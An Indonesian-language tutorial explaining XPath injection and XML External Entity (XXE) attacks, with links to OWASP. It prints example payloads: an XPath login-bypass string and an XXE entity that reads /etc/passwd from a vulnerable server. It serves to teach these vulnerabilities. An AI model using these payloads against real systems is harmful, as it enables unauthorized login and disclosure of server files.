# XPath Injection & XXE

XPath Injection dan XXE adalah dua jenis serangan terhadap aplikasi yang menggunakan **XML**.  
Keduanya memanfaatkan kelemahan dalam cara aplikasi memproses atau meng-query data XML.

- **XPath Injection** mengeksploitasi query XPath, yaitu bahasa yang digunakan untuk menelusuri data di dokumen XML.

- **XXE (XML External Entity)** mengeksploitasi fitur entity dalam XML parser untuk membaca file internal, melakukan SSRF, atau DoS.

## XPath Injection

XPath Injection adalah serangan yang memanipulasi query XPath untuk mendapatkan akses tidak sah terhadap data yang disimpan dalam dokumen XML.

### Contoh Payload

'test' or '1'='1'

'test' or id='2'

Jika digunakan pada input login, query XPath bisa jadi:

```xpath
/users/user[username='test' or '1'='1']
```

Akibatnya, attacker bisa login tanpa password yang benar.

## XML External Entity Attacks (XXE)

XXE adalah serangan yang mengeksploitasi fitur *entities* di dalam XML parser.

XML parser akan memproses deklarasi entity (`<!ENTITY ...>`) dan menggantinya saat membaca XML. Jika parser tidak dikonfigurasi dengan aman, attacker dapat menyisipkan entity eksternal untuk membaca file lokal, melakukan SSRF, dan serangan lainnya.

### Contoh XXE (Internal Entity)

```xml
<!DOCTYPE test [
  <!ENTITY internal-entity "kebaikan">
]>
```

Kemudian digunakan dalam XML:

```xml
<data>&internal-entity;</data>
```

Output: `kebaikan`

### Contoh XXE (File Disclosure)

```xml
<!DOCTYPE test [
  <!ENTITY internal-entity SYSTEM "file:///etc/passwd">
]>
```

Kemudian dipanggil:

```xml
<data>&internal-entity;</data>
```

Ini akan membaca isi file `/etc/passwd` dari server target (Jika parser rentan dan mengizinkan akses file system).

## 📚 Belajar

[OWASP: XML External Entities (XXE)](https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_(XXE).html)

[OWASP: XPath Injection](https://owasp.org/www-community/attacks/XPATH_Injection)
